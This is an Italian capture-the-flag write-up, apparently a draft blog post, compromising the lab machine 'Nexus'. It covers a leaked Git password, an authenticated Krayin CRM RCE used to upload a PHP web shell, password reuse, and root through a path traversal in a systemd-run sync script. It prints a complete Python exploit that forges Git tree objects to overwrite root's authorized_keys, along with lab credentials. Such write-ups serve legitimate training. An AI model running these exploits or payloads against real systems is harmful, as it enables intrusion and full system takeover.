+++
date = '2026-09-29T19:10:17+02:00'
draft = true
title = 'Nexus Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`29/09/2026`**

![pwn.png](/images/imgs_nexus/pwn.png)

---
# Introduzione

**_Nexus_** è una macchina **Linux** di livello **Easy** che tratta argomenti come web exploitation, password reuse e una complessa privilege escalation basata sui meccanismi interni di **Git**.

L'accesso iniziale si ottiene trovando credenziali esposte all'interno della cronologia dei commit di un repository **Gitea**. Queste credenziali garantiscono l'accesso a un'istanza **Krayin CRM**, vulnerabile ad una **Remote Code Execution**.

La privilege escalation richiede un lateral movement tramite **password reuse**, seguito dallo sfruttamento di un **timer systemd** custom. Lo script Python associato ad esso è vulnerabile ad una **Path Traversal**, che può essere sfruttata creando manualmente **Git** objects per sovrascrivere il file **`authorized_keys`** dell'utente **root**.

---
# Tecniche Utilizzate

- **Information Disclosure (Git Commit History)**

- **Krayin CRM Authenticated RCE (CVE-2026-38526)**

- **Password Reuse**

- **Path Traversal via Git Internals Abuse**

---
# Enumerazione

## nmap

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV -p- -vvv nexus.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte Aperte**:

- **22**/tcp SSH

- **80**/tcp HTTP

## HTTP - Enumerazione Web

Ho aggiunto **`nexus.htb`** al mio file **`/etc/hosts`** e ho analizzato il servizio HTTP sulla porta **`80`**, che ospita la webpage "**Nexus Energy Authority**".

![web1.png](/images/imgs_nexus/web1.png)

Nella sezione **`Careers -> View Role`** ho trovato l'email dell'hiring manager: **`j.matthew@nexus.htb`**.

![hr.png](/images/imgs_nexus/hr.png)

Ho eseguito uno scan sulle directory con **gobuster**, ma non ha prodotto risultati interessanti. Tuttavia, il fuzzing dei vhost con **ffuf** ha rivelato due virtual host attivi:

```bash
ffuf -u http://nexus.htb -H 'HOST: FUZZ.nexus.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -ac
```

![ffuf.png](/images/imgs_nexus/ffuf.png)

Ho aggiunto **`git.nexus.htb`** e **`billing.nexus.htb`** al mio file **`/etc/hosts`**.

Su **`git.nexus.htb`**, era hostata un'istanza **Gitea** (versione **`1.26.0`**). Nella sezione **`Explore`**, ho scoperto un repository esposto: **`admin/krayin-docker-setup`**, che conteneva un file **`.env`** e un **`docker-compose.yml`**.

![git1.png](/images/imgs_nexus/git1.png)

Ho clonato il repository sulla mia macchina, sono entrato nella directory del progetto e ho eseguito **`git show`**. All'interno del **`commit 9b817fa4e073d12fc43952acb09f3067b2f17adf`**, la variabile **`DB_PASSWORD`** esponeva la password.

![git2.png](/images/imgs_nexus/git2.png)

---
# Accesso Iniziale | Krayin CRM RCE (CVE-2026-38526)

Ho utilizzato la password appena scoperta insieme all'email delle risorse umane (**`j.matthew@nexus.htb`**) per accedere alla piattaforma **Krayin** su **`billing.nexus.htb`**.

![krayin.png](/images/imgs_nexus/krayin.png)

Cliccando sull'avatar dell'utente in alto a destra, ho identificato la versione del software: **`2.2.0`**.

![version.png](/images/imgs_nexus/version.png)

Una rapida ricerca su **Exploit-DB** ha rivelato una vulnerabilità nota per questa versione: **`CVE-2026-38526`**.

![exp.png](/images/imgs_nexus/exp.png)

**Nota**: _Questa è una **Remote Code Execution Autenticata** che affligge **Krayin CRM**. Sfrutta una validazione inpropria dell'input o i meccanismi di caricamento dei file all'interno della dashboard. Fornendo credenziali valide, un attaccante può caricare un payload malevolo (es. un **file PHP**) che il backend successivamente esegue, garantendo una shell nel contesto del web server._

Ho scaricato l'exploit, ho preso un **PHP cmd** da [Online - Reverse Shell Generator](https://www.revshells.com/), e l'ho eseguito:

```bash
python3 52629.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f shell.php
```

![rce1.png](/images/imgs_nexus/rce1.png)

Ho visitato l'url generato ed eseguito il codice per una reverse shell all'interno della webshell, catturando una shell come **`www-data`**.

![rce2.png](/images/imgs_nexus/rce2.png)

![initial.png](/images/imgs_nexus/initial.png)

---
# Lateral Movement | Password Reuse → jonas

Ho controllato l'**`/etc/passwd`** e ho identificato **`jonas`** come unico utente sulla macchina.

Inizialmente, ho provato a riutilizzare le credenziali che già possedevo, ma nulla. Ho stabilizzato la shell e mi sono connesso al database **MySQL** utilizzando una nuova password trovata all'interno del file **`.env`**:

![env.png](/images/imgs_nexus/env.png)

```bash
mysql -D krayin -u krayin -p
```

![db.png](/images/imgs_nexus/db.png)

Tuttavia, ho trovato solo l'hash della password per **`j.matthew`**, che avevo già.
Facendo un passo indietro, ho deciso di testare semplicemente la password del file **`.env`** direttamente switchando utente **`su jonas`**.

![userf.png](/images/imgs_nexus/userf.png)

**User flag**.

---
# Privilege Escalation | Git Internals Abuse → root

Dopo un'estesa fase di enumerazione locale manuale che non ha prodotto nulla, ho trasferito ed eseguito **linpeas**.

```text
══╣ Additional timer files: (T1053.003)                                                                
Potential privilege escalation in timer file: /etc/systemd/system/gitea-template-sync.timer                
  └─ RELATIVE_PATH: Uses relative path in Unit directive
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/gitea-template-sync.timer
  └─ RELATIVE_PATH: Uses relative path in Unit directive
```

Stavo rileggendo l'output di **linpeas** per la terza volta, e la menzione di una '**Potential privilege escalation in timer file**' continuava a saltarmi all'occhio. Ho deciso di analizzare il servizio:

```bash
systemctl cat gitea-template-sync.service
```

![timer.png](/images/imgs_nexus/timer.png)

Ho analizzato **`/etc/gitea/template-sync.py`** con **Snyk**, che ha segnalato una vulnerabilità di **Path Traversal**:

![snyk.jpeg](/images/imgs_nexus/snyk.jpeg)

```Python
target = os.path.join(stage_path, filepath)
target_dir = os.path.dirname(target)
```

**Nota**: _La funzione **`os.path.join(stage_path, filepath)`** non normalizza il percorso né neutralizza le sequenze **`..`**. Se **`filepath`** è controllato dall'attaccante, un valore come **`../../../../root/.ssh/authorized_keys`** fa sì che la destinazione si risolva direttamente in **`/root/.ssh/authorized_keys`**. Questo consente la **scrittura arbitraria di file** come **root**._

## Non così Easy

Per sfruttare questa vulnerabilità, non è possibile utilizzare i client **Git** standard poiché sanitizzano i percorsi dei file prima di eseguire il commit. Dovevo creare manualmente i **Git objects**. Poiché farlo richiede una solida comprensione della struttura interna degli oggetti di **Git** e la scrittura di codice per bypassare la sanitizzazione del client, mi sono affidato all'**IA** per aiutarmi a costruire il seguente exploit in **Python**:

```Python
#!/usr/bin/env python3                                                                             
import os, hashlib, zlib, subprocess, shutil                                   
REPO_DIR  = "/tmp/fall-template"                                                                   
GITEA     = "localhost:3000"                                                                       
USER      = "jones"                                                                                
PASS      = "y27xb3ha!!74GbR"
REPO      = "fall-template"
SSH_KEY   = "/tmp/.exploit_key"
SSH_PUB   = "/tmp/.exploit_key.pub"
TRAVERSAL = "../../../../../../root/.ssh/authorized_keys"

# 1. SSH Key generation
if not os.path.exists(SSH_KEY):
    subprocess.run(["ssh-keygen","-t","ed25519","-f",SSH_KEY,"-N",""], check=True)
with open(SSH_PUB,"rb") as f:
    pubkey = f.read().strip() + b"\n"

# 2. Local Repo init
if os.path.exists(REPO_DIR):
    shutil.rmtree(REPO_DIR)
os.makedirs(REPO_DIR)
os.chdir(REPO_DIR)
subprocess.run(["git","init","-q","-b","main"], check=True)

obj_dir = ".git/objects"
os.makedirs(obj_dir, exist_ok=True)

def write_object(header, content):
    data = header + b"\0" + content
    sha  = hashlib.sha1(data).hexdigest()
    path = os.path.join(obj_dir, sha[:2], sha[2:])
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path,"wb") as f:
        f.write(zlib.compress(data))
    return sha

# 3. Blob creation
blob = pubkey
blob_sha = write_object(b"blob " + str(len(blob)).encode(), blob)

# 4. Tree creation with traversal name
entry = b"100644 " + TRAVERSAL.encode() + b"\0" + bytes.fromhex(blob_sha)
tree_sha = write_object(b"tree " + str(len(entry)).encode(), entry)

# 5. Commit
author = b"pwn <pwn@localhost> 0 +0000"
commit_content = (b"tree " + tree_sha.encode() + b"\n"
                  b"author " + author + b"\n"
                  b"committer " + author + b"\n\npwn\n")
commit_sha = write_object(b"commit " + str(len(commit_content)).encode(), commit_content)

# 6. Ref main
os.makedirs(".git/refs/heads", exist_ok=True)
with open(".git/refs/heads/main","w") as f:
    f.write(commit_sha + "\n")

# 7. Push
url = f"http://{USER}:{PASS}@{GITEA}/{USER}/{REPO}.git"
subprocess.run(["git","remote","add","origin",url], check=True)
subprocess.run(["git","push","-u","origin","main","--force"], check=True)

print(f"[+] blob={blob_sha[:7]} tree={tree_sha[:7]} commit={commit_sha[:7]}")
print("[+] push OK")
```

**Nota**: _Questo script bypassa le restrizioni standard del client **Git** interagendo manualmente con il database interno dei **Git objects**. Crea un repository locale, genera un **blob** contenente la mia **chiave SSH pubblica** e costruisce un oggetto **tree** in cui il nome del file è impostato esplicitamente sul payload di **path traversal**. Una volta che questo commit manipolato viene pushato forzatamente sul server **Gitea**, lo script vulnerabile **`template-sync.py`** esegue il pull del repository. La funzione difettosa **`os.path.join()`** concatena il **base path** con la mia stringa di traversal, scrivendo la **chiave SSH** direttamente nel file **`authorized_keys`** dell'utente **root**._

![priv1.png](/images/imgs_nexus/priv1.png)

Dopo aver eseguito lo script, ho semplicemente effettuato l'accesso tramite **SSH** come **root** utilizzando la **chiave privata** generata:

```bash
ssh -i /tmp/.exploit_key -o StrictHostKeyChecking=no root@localhost
```

![rootf.png](/images/imgs_nexus/rootf.png)

**Root flag**.

---
# Considerazioni Finali

Sono in totale disaccordo con il rating **Easy**.

Sebbene la macchina in sé non richieda un numero eccessivo di passaggi e il percorso per ottenere l'accesso iniziale sia lineare e intuitivo, la privilege escalation è tutt'altra storia.
Trovare la vulnerabilità nel timer custom non è scontato, capire come la **Path Traversal** interagisca con i pull di **Git** è complicato, e sfruttarlo è decisamente difficile. Poiché richiede una solida comprensione della struttura interna degli oggetti di **Git** e la capacità di scripting per bypassare la sanitizzazione standard del client, appoggiarsi all'**IA** per strutturare il payload per me è stato necessario.

Nel complesso, un'ottima macchina che ti costringe a scavare a fondo e imparare nuove meccaniche avanzate.

**Fonti**:

- **Krayin CRM 2.2.0 RCE (CVE-2026-38526)** | https://www.exploit-db.com/exploits/52629

- **Git Internals - Objects** | https://git-scm.com/book/en/v2/Git-Internals-Git-Objects